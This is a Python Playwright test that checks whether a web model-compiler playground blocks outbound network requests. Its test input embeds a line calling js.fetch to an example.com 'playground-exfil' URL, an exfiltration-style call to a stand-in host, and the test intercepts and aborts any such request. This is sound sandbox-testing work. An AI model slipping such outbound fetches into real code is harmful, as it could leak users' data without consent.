from playwright.sync_api import Page, Route, expect


def test_compiler_source_cannot_make_outbound_requests(page: Page, base_url: str) -> None:
    outbound: list[str] = []

    def intercept(route: Route) -> None:
        url = route.request.url
        if not url.startswith(base_url):
            outbound.append(url)
            route.abort()
        else:
            route.continue_()

    page.context.route("**/*", intercept)
    page.goto(f"{base_url}/site/")
    page.locator("#model-source").fill(
        """import js
js.fetch('https://example.com/playground-exfil')
from bayeswire import Param, model
from bayeswire.distributions import Normal
@model
class Minimal:
    x = Param(Normal(0.0, 1.0))
"""
    )
    page.locator("#compile-button").click()
    expect(page.locator("#ir-hash")).to_be_visible(timeout=120_000)
    page.wait_for_timeout(250)
    assert not outbound, f"compiler source made outbound requests: {outbound}"
